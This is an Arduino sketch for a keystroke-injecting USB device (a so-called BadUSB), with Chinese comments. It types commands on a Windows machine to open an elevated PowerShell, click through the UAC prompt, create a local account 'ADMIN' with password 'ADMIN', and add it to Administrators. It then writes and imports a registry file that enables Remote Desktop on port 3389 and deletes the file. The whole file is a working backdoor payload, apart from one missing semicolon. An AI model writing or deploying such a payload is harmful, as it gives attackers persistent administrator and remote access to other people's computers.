void setup(){
  Keyboard.begin();
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(500); 
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.println("POWERSHELL.EXE -C START-PROCESS POWERSHELL -VERB RUNAS");
  Keyboard.println();
  delay(1000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.print('y');
  Keyboard.release(KEY_LEFT_ALT);
  delay(500);
  Keyboard.println("CMD");
  delay(50);
  Keyboard.println("CMD /C NET USER ADMIN ADMIN /ADD&NET LOCALGROUP ADMINISTRATORS ADMIN /ADD");
  delay(50)
  Keyboard.println("ECHO wINDOWS rEGISTRY eDITOR vERSION 5.00>3389.REG&&ECHO [hkey_local_machine\\system\\cURRENTcONTROLsET\\cONTROL\\tERMINAL sERVER]>>3389.REG&&ECHO \"FdENYtscCONNECTIONS\"=DWORD:00000000>>3389.REG&&ECHO [hkey_local_machine\\system\\cURRENTcONTROLsET\\cONTROL\\tERMINAL sERVER\\wDS\\RDPWD\\tDS\\TCP]>>3389.REG&&ECHO \"pORTnUMBER\"=DWORD:00000D3D>>3389.REG&&ECHO [hkey_local_machine\\system\\cURRENTcONTROLsET\\cONTROL\\tERMINAL sERVER\\wINsTATIONS\\rdp-tCP]>>3389.REG&&ECHO \"pORTnUMBER\"=DWORD:00000D3D>>3389.REG");
  delay(100);
  Keyboard.println("REGEDIT /S 3389.REG&&DEL 3389.REG&&EXIT");
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();
}

void loop(){
}
